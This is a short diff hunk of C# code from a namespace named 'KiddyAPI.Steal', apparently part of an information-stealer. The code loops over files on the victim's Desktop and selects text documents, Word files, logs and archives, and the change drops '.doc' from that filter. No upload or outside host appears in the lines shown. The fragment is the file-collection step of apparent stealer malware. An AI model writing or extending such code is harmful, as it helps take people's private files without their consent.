@@ -99,7 +99,7 @@ namespace KiddyAPI.Steal
                 foreach (FileInfo file in new DirectoryInfo(
                     Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
                 {
-                    if (file.Extension.Equals(".txt") || file.Extension.Equals(".doc") ||
+                    if (file.Extension.Equals(".txt") || 
                         file.Extension.Equals(".docx") || file.Extension.Equals(".log") ||
                         file.Extension.Equals(".rar") || file.Extension.Equals(".zip"))
                     {
